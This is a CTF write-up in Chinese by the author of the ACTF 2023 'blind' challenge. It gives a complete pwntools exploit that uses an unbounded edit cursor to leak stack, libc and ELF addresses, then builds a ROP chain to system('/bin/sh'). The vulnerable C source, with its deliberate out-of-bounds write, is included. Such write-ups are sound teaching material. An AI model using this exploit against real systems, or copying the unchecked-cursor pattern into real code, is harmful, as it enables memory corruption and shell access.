# ACTF2023 blind WP

## 解题思路

这道题提供了字符编辑功能，玩两下就可以发现存在越界编辑

改改周围看下会发生什么——

```
[A]aaaaaa
> 8DW
aaaaaa 
> AS
Aaaaaaa[]
```

当右移8再+1后，我们发现输出位置改变了，说明改到了字符串指针，那么`8D8W`就可以输出这个指针本身的值，发现是`0x7fff`开头的栈上地址。那么只要修改这个指针就可以dump stack。

然后搞清楚程序修改的机制：首先显而易见的我们可以知道有两个指针——一个是每次输出字符串name的地址，一个是当前修改的位置。那么修改的位置是独立指针，还是基于名字的偏移？我们发现在`8DW`后需要`AS`才能恢复原状，也就是说在修改指针地址后，当前修改的位置也偏移了。这就说明输出的是指针，而`[]`是一个下标。于是我们大概可以还原出这样的代码：

```c
switch(toupper(ch)) {
    case 'W': p[cursor] += times; break;
    case 'A': cursor -= times; break;
    case 'S': p[cursor] -= times; break;
    case 'D': cursor += times; break;
    case ' ': p[cursor] ^= 0x20; break;
    case '\n': break;
    default : printf("Invalid: %c\n", ch);   break;
}
```

还有一个问题是，修改指针后是否立即生效？试一下`8DWS`发现输出还是Aaaaaaa，说明修改偏移是即时的，而修改指针会在下一次生效。也就是说修改时传入的是指针副本。于是又可以还原出一些逻辑。

```c
int main() {
	char namebuf[0x8];
    char *ptr = namebuf;
...
    do {
        print(ptr);
        printf("\n> ");
    } while (process(ptr)); // 传入了指针的副本，当次修改不影响指向
    printf("Hello, %s!\n", ptr);
    return 0;
}
```

这样就可以任意修改和泄露了。栈上有libc、elf以及栈的地址，泄露后把偏移改到`elf&0xfffffffff000`的位置leak，然后ROPGadget找到`pop rdi; ret`的地址，用DynELF解`system`，把名字改成`/bin/sh`，ret2csu即可。（作为一个良心出题人，给大家用了2.31。如果是2.35就要去dump libc了;）

exp：

```python
#! /usr/bin/env python3
# -*- encoding: utf-8 -*-
'''
@File    : std.py
@Time    : 2023/10/6 Mon 19:02:36
@Author  : Wh1sper
@Desc    : exp for ACTF 2023 blind
'''

from pwn import *

context.update(arch='amd64', os='linux', log_level='debug', timeout=None)

io = remote('120.46.65.156', 32104)

base, offset = 0, 0
def Off(pos): # 将[]修改到指定偏移
    global offset
    cnt = pos - offset
    offset = pos
    if cnt > 0:
        return str(cnt).encode() + b'D'
    else:
        return str(-cnt).encode() + b'A'

def setval(_offset, orig, to): # 修改base[_offset]的值为to，需要知道original
    payload = b''
    for (i, (b, a)) in enumerate(zip(orig, to)):
        change = a - b
        if change != 0:
            payload += Off(_offset + i)
        if change > 0:
            payload += str(change).encode() + b'W'
        elif change < 0:
            payload += str(-change).encode() + b'S'
    return payload

def Base(addr): # 将base指针修改到指定位置
    global base
    payload = setval(stack_addr - base, p64(base), p64(addr))
    base = addr
    return payload

def leak(addr): # base到指定位置然后输出
    payload = Base(addr) + Off(-1)
    io.sendlineafter(b"> ", payload)
    ret = io.recvuntil(b'\n> ', drop=True)
    io.unrecv(b'> ')
    return ret

def dump_elf(baseaddr):
    with open('dump', 'wb') as f:
        for i in range(0x1000 // 8):
            print(hex(i))
            f.write(leak(baseaddr + i * 8))
    print("dump done.")
    exit(0)

payload = setval(0, b'Aaaaaaa', b'/bin/sh')
io.sendlineafter(b"\n> ", payload)

payload = Off(8) + b'8W'
io.sendlineafter(b"> ", payload)
stack_addr = u64(io.recvuntil(b"\n", drop=True))
log.success(f'Leak stack: {stack_addr:#014x}')
base = stack_addr

# Step 1: View stack.
# for i in range(20):
#     print(f"{i:#x}: {u64(leak(stack_addr + i * 8)):#014x}")
# exit(0)

libc_addr = u64(leak(stack_addr + 0x10))
log.success(f'Leak libc: {libc_addr:#014x}')
elf_addr = u64(leak(stack_addr + 0x28))
log.success(f'Leak elf: {elf_addr:#014x}')

# Step 2: Dump elf
# dump_elf(elf_addr & 0xfffffffff000)

d = DynELF(leak, libc_addr, libcdb=False)
system_addr = d.lookup('system', 'libc')
log.success(f'Leak system: {system_addr:#014x}')

val_0x18 = u64(leak(stack_addr + 0x18))
val_0x20 = u64(leak(stack_addr + 0x20))
poprdi_ret = 0x5db + (elf_addr & 0xfffffffff000) # ROPgadget --binary dump --rawArch=x86 --rawMode=64 | grep "pop rdi ; ret"
io.sendlineafter(b"> ", Base(stack_addr))
io.sendlineafter(b"> ", setval(0x10, p64(libc_addr), p64(poprdi_ret))) # poprdi, ret
io.sendlineafter(b"> ", setval(0x18, p64(val_0x18), p64(stack_addr - 8))) # binsh_addr
io.sendlineafter(b"> ", setval(0x20, p64(val_0x20), p64(poprdi_ret + 1))) # ret
io.sendlineafter(b"> ", setval(0x28, p64(elf_addr), p64(system_addr))) # system
io.sendlineafter(b"> ", b'')

context.log_level = 'info'
io.interactive()

```

## 解题情况

大家的解法和官方解相差无几。一些队伍leak libc地址后查到了版本是`Debian GLIBC 2.31-13+deb11u7`，可以不用dump直接打ROP。

星盟的师傅非常牛逼，在不dump程序的情况下爆破到了ROP gadget。具体做法是：

1. 由于8A（name往低8字节）存放了返回地址，所以把name修改为栈上泄露的elf地址，通过name-0x8位置爆破前面泄露出来的elf函数附近的ret。
2. 通过布置栈（将返回地址放到name[0x30]），爆破csu的pop6_gadget。

这样就无需dump可以直接打了（需要用DynELF解出system地址），666

## 题目源码

不同gcc版本编译偏移可能会有变化，题目用的镜像是`debian 11(bullseye)`

```c
// gcc src.c -o blind
#include <stdio.h>
#include <stdlib.h>
#include <ctype.h>
#include <string.h>

ssize_t cursor = 0;
int process(char *p) {
    char *ops = NULL;
    int has_d = 0;
    size_t bufsize;
    ssize_t i = 0, len, rep;
    if ((len = getline(&ops, &bufsize, stdin)) == -1) {
        puts("Error.");
        exit(EXIT_FAILURE);
    } else if (len == 1) {
        free(ops);
        return 0;
    }
    while (i < len) {
        char ch = ops[i++];
        ssize_t times;
        if (isdigit(ch)) {
            rep = rep * 10 + (ch - '0');
            has_d = 1;
            continue;
        }
        times = has_d ? rep : 1;
        switch(toupper(ch)) {
            case 'W': p[cursor] += times; break;
            case 'A': cursor -= times; break;
            case 'S': p[cursor] -= times; break;
            case 'D': cursor += times; break;
            case ' ': p[cursor] ^= 0x20; break;
            case '\n': break;
            default : printf("Invalid: %c\n", ch);   break;
        }
        rep = 0;    has_d = 0;
    }
    free(ops);
    return 1;
}
void print(char *p) {
    int i;
    for (i = 0; i < 0x8; ++i) {
        if (i == cursor)
            printf("[%c]", p[i]);
        else
            printf("%c", p[i]);
    }
}
int main() {
    char namebuf[0x8];
    char *ptr = namebuf;
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
    memset(namebuf, 'a', sizeof(namebuf));
    namebuf[0] ^= 0x20;
    namebuf[sizeof(namebuf) - 1] = 0;
    puts("Welcome to ACTF, type your name here.");
    puts("Use A/D to move, W/S to change letter, <Space> to change Capital. You can add prefix n to repeat W/A/S/D command(3A2W = AAAWW), just like vi. When you finish it, send a single <Enter> to submit.");
    do {
        print(ptr);
        printf("\n> ");
    } while (process(ptr));
    printf("Hello, %s!\n", ptr);
    return 0;
}

```

